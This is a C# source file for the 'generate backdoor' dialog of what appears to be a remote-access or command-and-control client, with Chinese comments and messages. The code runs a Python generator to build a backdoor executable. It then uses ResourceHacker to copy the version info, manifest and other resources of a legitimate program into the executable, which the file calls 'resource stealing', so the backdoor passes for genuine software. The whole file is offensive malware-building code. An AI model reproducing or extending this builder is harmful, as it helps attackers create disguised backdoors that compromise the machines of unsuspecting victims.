using System;
using System.IO;
using System.Windows;
using Microsoft.Win32;

// 生成后门
namespace Client
{
    public partial class GenerateBackDoor
    {
        bool selectProfile = false;

        public GenerateBackDoor()
        {
            InitializeComponent();
        }

        // 选择源码
        private void SelectProfile_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "选择 Profile";
            openFileDialog.Filter = "(*.txt) | *.txt";
            if (Environment.CurrentDirectory.Contains("Client\\bin"))
            {
                openFileDialog.InitialDirectory = Path.GetFullPath(Environment.CurrentDirectory + "\\..\\..\\..\\Shell\\Generator");
            }
            else
            {
                openFileDialog.InitialDirectory = Path.GetFullPath(Environment.CurrentDirectory + "\\..\\Shell\\Generator");
            }
            if ((bool)openFileDialog.ShowDialog())
            {
                selectProfile = true;
                selectProfile_Button.Content = openFileDialog.FileName;
            }
        }

        // 生成
        private void Generate_Click(object sender, RoutedEventArgs e)
        {
            string bit = Function.GetRadioResult(bit_WrapPanel);
            if (bit == null)
            {
                MessageBox.Show("未选择位数", "警告", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            if (bit == "x86")
            {
                MessageBox.Show("暂不支持 x86", "警告", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (!selectProfile)
            {
                MessageBox.Show("未选择 Profile", "警告", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            // 调用生成器脚本
            string GeneratePath = Environment.CurrentDirectory + "\\tmp\\Product.exe";
            try
            {
                Function.InvokeTool("python", "\"" + Path.GetDirectoryName(selectProfile_Button.Content.ToString()) + "\\Generator.py\" \"" + selectProfile_Button.Content + "\" \"" + GeneratePath + "\"");
            }
            catch
            {
                MessageBox.Show("生成器脚本调用失败 / Python 未添加至环境变量", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (!File.Exists(GeneratePath))
            {
                MessageBox.Show("生成失败 / Visual Studio 的 msbuild.exe 未添加至环境变量\nC:\\Program Files\\Microsoft Visual Studio\\xxxx\\Professional\\MSBuild\\Current\\Bin", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Title = "添加资源 (强烈建议)，选择 PE 文件进行资源窃取";
                openFileDialog.Filter = "(*.exe;*.dll) | *.exe;*.dll";
                if (openFileDialog.ShowDialog() == true)
                {
                    string resFilePath = openFileDialog.FileName;
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"tmp\\Product.exe\" -save \"tmp\\Product.exe\" -res \"" + resFilePath + "\" -action addoverwrite -mask *");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + resFilePath + "\" -save \"tmp\\VERSIONINFO.res\" -action extract -mask VERSIONINFO");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + resFilePath + "\" -save \"tmp\\MANIFEST.res\" -action extract -mask MANIFEST");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"tmp\\Product.exe\" -save \"tmp\\Product.exe\" -res \"tmp\\VERSIONINFO.res\" -action addoverwrite -mask *");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"tmp\\Product.exe\" -save \"tmp\\Product.exe\" -res \"tmp\\MANIFEST.res\" -action addoverwrite -mask *");
                }
            }
            catch
            {
                MessageBox.Show("资源添加失败", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
            }

            try
            {
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Title = "选择生成路径";
                saveFileDialog.Filter = "(*.*) | *.*";
                saveFileDialog.FileName = "Product.exe";
                if (saveFileDialog.ShowDialog() == true)
                {
                    File.Move(GeneratePath, saveFileDialog.FileName);
                    MessageBox.Show("生成完毕 ! ! !\n如果添加的资源导致程序无法启动，请更换资源。", "通知", MessageBoxButton.OK, MessageBoxImage.Information);
                }
            }
            catch
            {
                MessageBox.Show("生成失败", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
            }

            File.Delete(GeneratePath);
        }
    }
}